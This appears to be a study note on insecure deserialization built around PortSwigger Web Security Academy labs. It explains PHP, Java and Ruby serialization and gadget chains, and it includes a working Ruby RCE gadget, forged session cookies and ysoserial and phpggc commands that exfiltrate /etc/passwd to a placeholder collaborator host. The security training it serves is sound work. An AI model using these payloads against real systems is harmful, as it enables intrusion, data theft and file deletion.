# Insecure deserialization

## **How to identify insecure deserialization**

During auditing, you should look at all data being passed into the website and try to identify anything that looks like serialized data. Serialized data can be identified relatively easily if you know the format that different languages use. Once you identify serialized data, you can test whether you are able to control it. 

### **PHP serialization format**

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:

```
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look something like this:

```
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

This can be interpreted as follows:

- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`

The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.
        

### **Java serialization format**

Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For  example, serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`

## **Manipulating serialized objects**

### **Modifying object attributes**

As a simple example, consider a website that uses a serialized `User`object to store data about a user's session in a cookie. If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:

```json
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

The `isAdmin` attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to `1` (true), re-encode the object, and overwrite their current cookie with this modified value, which leads to privilege escalation.

### **Modifying data types**

PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (`==`) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to `true`.

Unusually, this also works for any alphanumeric string that starts with a number. In this case, PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == "5 of something"` is in practice treated as `5 == 5`.

Likewise, on PHP 7.x and earlier the comparison `0 == "Example string"` evaluates to `true`, because PHP treats the entire string as the integer `0`.

Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous logic flaws.

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

Let's say an attacker modified the password attribute so that it contained the integer `0` instead of the expected string. As long as the stored password does not start with a number, the condition would always return `true`, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.

<aside>
💡

In PHP 8 and later, the `0 == "Example string"` comparison evaluates to `false` because strings are no longer implicitly converted to `0` during comparisons. As a result, this exploit is not possible on these versions of PHP.

The behavior when comparing an alphanumeric string that starts with a number remains the same in PHP 8. As such, `5 == "5 of something"` is still treated as `5 == 5`.

</aside>

When working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort. 

## **Using application functionality**

As well as simply checking attribute values, a website's functionality might also perform dangerous operations on data from a deserialized object. In this case, you can use insecure deserialization to pass in unexpected data and leverage the related functionality to do damage. 

For example, as part of a website's "Delete user" functionality, the user's profile picture is deleted by accessing the file path in the `$user->image_location` attribute. If this `$user` was created from a serialized object, an attacker could exploit this by passing in a modified object with the `image_location` set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.
        

## **Magic methods**

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores. 

Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is
 `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`. Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.

Magic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met. 

Most importantly in this context, some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.

In Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object. However, `Serializable` classes can also declare their own `readObject()` method as follows:

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```

A `readObject()` method declared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more 
closely.

 You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits. 

## **Injecting arbitrary objects**

In object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization. 

Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then. 

If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit. 

## **Gadget chains**

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. 

In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.

### **Working with pre-built gadget chains**

Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first. 

There are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites. Even if you don't have access to the source code, you can use these tools to both identify and exploit insecure deserialization vulnerabilities with relatively little effort. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain. 

#### **ysoserial**

One such tool for Java deserialization is "ysoserial". This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually. 

<aside>
💡

In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:

```java
java \
  --add-opens java.base/java.lang=ALL-UNNAMED \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  -jar ysoserial-all.jar [payload] '[command]' | base64 -w 0
```

</aside>

Not all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server: 

- The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the targetapplication using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain fordetection purposes. If you spot a serialized object in the traffic, youcan try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.
- `JRMPClient`is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.

[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

#### **PHP Generic Gadget Chains**

Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use "PHP Generic Gadget Chains" (PHPGGC). 

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

### **Working with documented gadget chains**

There may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually. Tweaking the code may require some basic understanding of the language and framework, and you might sometimes need to serialize the object yourself, but this approach is still considerably less effort than building an exploit from scratch. 

```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# Require Ruby 2.7

Gem::SpecFetcher
Gem::Installer

require "base64"

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "date >> /tmp/rce9b.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump({payload: [Gem::SpecFetcher, Gem::Installer, r]})
puts Base64.strict_encode64(payload)
```

## **Creating your own exploit**

To successfully build your own gadget chain, you will almost certainly need source code access. The first step is to study this source code to identify a class that contains a magic method that is invoked during deserialization. Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes.

If the magic method is not exploitable on its own, it can serve as your "kick-off gadget" for a gadget chain. Study any methods that the kick-off gadget invokes. Do any of these do something dangerous with data that you control? If not, take a closer look at each of the methods that they subsequently invoke, and so on. 

Repeat this process, keeping track of which values you have access to, until you either reach a dead end or identify a dangerous sink gadget into which your controllable data is passed. 

Once you've worked out how to successfully construct a gadget chain within the application code, the next step is to create a serialized object containing your payload. This is simply a case of studying the class declaration in the source code and creating a valid serialized object with the appropriate values required for your exploit. As we have seen in previous labs, this is relatively simple when working with string-based serialization formats. 

## **PHAR deserialization**

PHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths. One of these is the `phar://` wrapper, which provides a stream interface for accessing PHP Archive (`.phar`) files.

The PHP documentation reveals that `PHAR` manifest files contain serialized metadata. Crucially, if you perform any filesystem operations on a `phar://` stream, this metadata is implicitly deserialized. This means that a `phar://` stream can potentially be a vector for exploiting insecure deserialization, provided that you can pass this stream into a filesystem method.

## **Exploiting deserialization using memory corruption**

Even without the use of gadget chains, it is still possible to exploit insecure deserialization. If all else fails, there are often publicly documented memory corruption vulnerabilities that can be exploited via insecure deserialization. These typically lead to remote code execution. 

Deserialization methods, such as PHP's `unserialize()` are rarely hardened against these kinds of attacks, and expose a huge amount of attack surface. This is not always considered a vulnerability in its own right because these methods are not intended to handle user-controllable input in the first place.
        
    

## Labs

### **Manipulating serialized objects**

[**Modifying serialized objects**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

```markdown
# Set {s:5:"admin";b:1;} to return always True
# Manualy - Encode - Base64 -> URL
Cookie: session=O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

# Using Hackvector
Cookie: session=<@base64>O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}</@base64>
```

[**Modifying serialized data types**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

```markdown
# Set {s:12:"access_token";b:1;} to return always True
# Set {"username";s:13:"administrator"} to get Administrative privileges
# Manualy - Encode - Base64 -> URL 
Cookie: session=O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}

# Using Hackvector
Cookie: session=<@urlencode_not_plus><@base64>O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}</@base64></@urlencode_not_plus>
```

### **Using application functionality**

[**Using application functionality to exploit insecure deserialization**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

```markdown
# Set {s:11:"avatar_link";s:23:"/home/carlos/morale.txt";} to point morale.txt
# Invoke some "access_token" object error, as it leads to tokens exposure.

# Login as gregg user and change the request line to POST /my-account/delete    and send the request. Gregg will be deleted, along with Carlos's morale.txt file
POST /my-account/delete HTTP/2
Cookie: session=<@base64>O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"kqov67nnchjhtyuadxe6nmzmlv8dyyyz";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}</@base64>
```

### **Injecting arbitrary objects**

[**Arbitrary object injection in PHP**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

```markdown
# Notice source code file - /libs/CustomTemplate.php~
# In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path. 
# Create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt
Cookie: session=<@urlencode_not_plus><@base64>O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}</@base64></@urlencode_not_plus>

# Send the request. The __destruct() magic method is automatically invoked and  will delete Carlos's file. 
```

### Gadget Chains

[**Exploiting Java deserialization with Apache Commons**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

```markdown

# RCE
java -jar ysoserial-all.jar CommonsCollections2 'whoami' | base64 -w 0

# Exfiltrate Data via curl
java -jar ysoserial-all.jar CommonsCollections2 'curl -X POST --data-binary    @/etc/passwd http://BURP-COLLABORATOR' | base64 -w 0

# Exfiltrate Data via wget
java -jar ysoserial-all.jar CommonsCollections2 'wget --post-file=/etc/passwd   BURP-COLLABORATOR' | base64 -w 0
```

[**Exploiting PHP deserialization with a pre-built gadget chain**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

```markdown
# RCE
./phpggc Symfony/RCE4 exec 'whoami' 

# Exfiltrate data via nslookup
./phpggc Symfony/RCE4 exec 'nslookup `whoami`.BURP-COLLABORATOR' 

# Exfiltrate data via curl
./phpggc Symfony/RCE4 exec 'curl -X POST --data-binary @/etc/passwd http://BURP-COLLABORATOR'

# /cgi-bin/phpinfo.php leaks secrets key to sign cookie with a SHA-1 HMAC hash
# PHP code to sign phpggc generated payload
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```

[**Exploiting Ruby deserialization using a documented gadget chain**](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

```ruby
# Exploit require Ruby 2.7
# Exploit - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
```